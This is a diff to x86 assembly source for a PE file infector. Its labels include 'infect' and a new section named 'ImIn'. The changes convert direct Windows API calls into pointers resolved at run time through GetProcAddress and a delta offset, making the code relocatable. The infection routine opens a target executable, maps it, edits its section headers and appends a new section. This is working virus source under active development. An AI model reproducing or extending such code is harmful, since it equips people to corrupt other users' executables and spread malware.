@@ -61,14 +61,14 @@ NewSectionName	db	"ImIn",0
 
 ; DLL
 sExitProcess	db	'ExitProcess', 0 
-sCreateFile	db	'CreateFile', 0 
-sCreateFileMapping	db	'CreateFileMapping', 0 
+sCreateFile	db	'CreateFileA', 0 
+sCreateFileMapping	db	'CreateFileMappingA', 0 
 sMapViewOfFile	db	'MapViewOfFile', 0 
 sUnmapViewOfFile	db	'UnmapViewOfFile', 0 
 sCloseHandle	db	'CloseHandle', 0 
 sWriteFile	db	'WriteFile', 0 
 sGetProcAddress	db	'GetProcAddress', 0 
-sMessageBoxA	db	'MessageBoxA', 0 
+sMessageBox	db	'MessageBoxA', 0 
 sLoadLibrary	db	'LoadLibraryA', 0 
 sHelloWorld	db	'Hello World (MsgBox Without include lib BIATCH!)', 0
 sUser32		db	'USER32.DLL', 0
@@ -80,7 +80,7 @@ pMapViewOfFile	dd	?
 pUnmapViewOfFile	dd	?
 pCloseHandle	dd	?
 pWriteFile	dd	?
-pMessageBoxA	dd	?
+pMessageBox	dd	?
 pKernel32	dd	?
 pUser32		dd	?
 pLoadLibrary	dd	?
@@ -144,7 +144,7 @@ PDELTA	offset sUser32
 call	[DELTA pLoadLibrary] ; LoadLibrary("user32.dll")
 mov	[DELTA pUser32], eax
 ; GET ALL THE THINGS !
-GETADDR	sMessageBoxA, pUser32, pMessageBoxA
+GETADDR	sMessageBox, pUser32, pMessageBox
 GETADDR	sExitProcess, pKernel32, pExitProcess
 GETADDR	sCreateFile, pKernel32, pCreateFile
 GETADDR	sCreateFileMapping, pKernel32, pCreateFileMapping
@@ -157,18 +157,9 @@ push	0
 PDELTA	offset sHelloWorld
 PDELTA	offset sHelloWorld
 push	0
-call	[DELTA pMessageBoxA]
+call	[DELTA pMessageBox]
 
-; Get ExitProcess
-PDELTA	offset sExitProcess
-push	[DELTA pKernel32]
-call	[DELTA pGetProcAddress]
-
-jmp	begin
-
-; EXIT TEST
-push	0
-call 	eax
+jmp	infect
 
 ; Compare two strings : ecx/edx (EAX[0]: MATCH)
 strcmp:
@@ -191,7 +182,7 @@ ret
 
 
 
-begin:
+infect:
 
 ; OPEN FILE
 push	0
@@ -203,7 +194,7 @@ mov	eax, GENERIC_READ
 or	eax, GENERIC_WRITE
 push	eax
 PDELTA	offset FileName
-call	CreateFile
+call	[DELTA pCreateFile]
 call	CheckError
 mov	[DELTA PeFile], eax
 
@@ -214,7 +205,7 @@ push	0
 push	PAGE_READWRITE
 push	NULL
 PDELTA	PeFile
-call	CreateFileMapping
+call	[DELTA pCreateFileMapping]
 call	CheckError
 mov	[DELTA PeMapObject], eax
 
@@ -226,7 +217,7 @@ mov	eax,	FILE_MAP_READ
 or	eax,	FILE_MAP_WRITE
 push	eax
 PDELTA	PeMapObject
-call	MapViewOfFile
+call	[DELTA pMapViewOfFile]
 call	CheckError
 mov	[DELTA PeFileMap], eax
 mov	ebx, eax
@@ -390,11 +381,11 @@ add	esi, 01h ; TODO - WTF IS THIS SHIT ? (Size of all virtual size + 1?)
 mov	[eax], esi
 ; CLOSE
 PDELTA	PeFileMap
-call	UnmapViewOfFile
+call	[DELTA pUnmapViewOfFile]
 PDELTA	PeMapObject
-call	CloseHandle
+call	[DELTA pCloseHandle]
 PDELTA	PeFile
-call	CloseHandle
+call	[DELTA pCloseHandle]
 
 
 ; CREATE NEW SECTION 
@@ -418,17 +409,17 @@ push	0
 push	ecx
 push	esi
 PDELTA	PeFile
-call	WriteFile
+call	[DELTA pWriteFile]
 call	CheckError
 
 ; CLOSE
 PDELTA	PeFile
-call	CloseHandle
+call	[DELTA pCloseHandle]
 
 
 ; EXIT
 push	0
-call 	ExitProcess
+call 	[DELTA pExitProcess]
 
 
 ; Debug
@@ -468,7 +459,7 @@ push	MB_OK
 push	offset ErrorMessage
 push	eax
 push	0
-call	MessageBoxA
+call	MessageBox
 popa
 ret
 DebugMessageBox	endp
